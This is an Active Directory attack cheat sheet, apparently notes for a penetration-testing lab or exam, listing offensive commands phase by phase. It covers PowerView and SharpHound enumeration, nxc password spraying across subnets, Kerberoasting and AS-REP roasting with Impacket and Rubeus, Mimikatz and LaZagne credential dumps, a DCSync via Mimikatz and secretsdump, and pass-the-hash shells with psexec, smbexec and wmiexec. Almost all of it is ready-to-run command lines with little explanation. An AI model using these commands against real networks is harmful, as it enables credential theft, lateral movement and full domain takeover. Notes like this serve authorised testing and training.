## Enumeration Phase

Use PowerView

- Import-Module .\PowerView.ps1
- Get-NetDomain
- Get-DomainPolicy
- Get-NetDomainController
- Get-NetUser / Get-NetUser -AdminCount 1
- Get-NetGroup / Get-NetGroupMember -GroupName $groupName
- Get-NetSession
- Get-NetComputer
- Invoke-ShareFinder
- Get-NetGPO
- Get-NetUser -SPN
- Get-NetOU
- Invoke-UserHunter
- Invoke-Kerberoast

Use Bloodhound

- sudo neo4j start
- sudo bloodhound

Use SharpHound

- Import-Module .\Sharphound.ps1
- Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "FileName"

Check SYSVOL Share Drive

- Find-DomainShare -CheckShareAccess

## User obtained

Spray the network

- nxc winrm 10.1.1.1/24 -u 'test' -p 'pass'
- nxc smb 10.1.1.0/24 -u 'user' -p 'pass' --users
- nxc smb 10.1.1.0/24 -u 'user' -p 'pass' --pass-pol
- nxc smb 10.1.1.0/24 -u 'user' -p 'pass' --shares
- nxc smb 10.1.1.1 -u /path/to/users.txt -p Password1 --continue-on-success
- smbclient -L $ip -U userName
- smbclient -U userName //$ip/share
- Impacket-GetADUsers -all -user userName -dc-ip $ip

Kerberoasting

- GetUserSPNs.py -request -dc-ip $ip domain/userName
- GetNPusers.py -dc-ip $ip -request domain/ListOfUsers
- impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast domain/user
- impacket-GetUserSPNs domain/user:'password' -dc-ip $ip -debug -outputfile kerberoast.tx
- .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

## Admin obtained

Mimikatz Dump
LaZagne Dump
Check for SAM & SYSTEM
Check for Window.Old folder

## BloodHound Vector Attack

GenericWrite

- assign SPN to target then do keberoasting

WriteDACL

- DCsync attack
  - Need user to have 1 of these _Replicating Directory Changes_, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set*
  - Use mimikatz and run lsadump::dcsync /user:corp\user-name
  - Use impacket-secretsdump -just-dc-user dave domain/user-name:Password@dc-ip

## Getting A Shell

psexec

- psexec.py domain/user:Password@10.10.10.100
- psexec.py -hashes 00000000000000000000000000000000:ntlm-hash user@$ip
- psexec.py user@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

smbexec.py

- smbexec.py domain/User:Password@$ip

wmiexec.py

- wmiexec.py domain/user:Password@$ip

smbclient

- smbclient \\\\ip-address\\share-drive -U user --pw-nt-hash $ntlm-hash
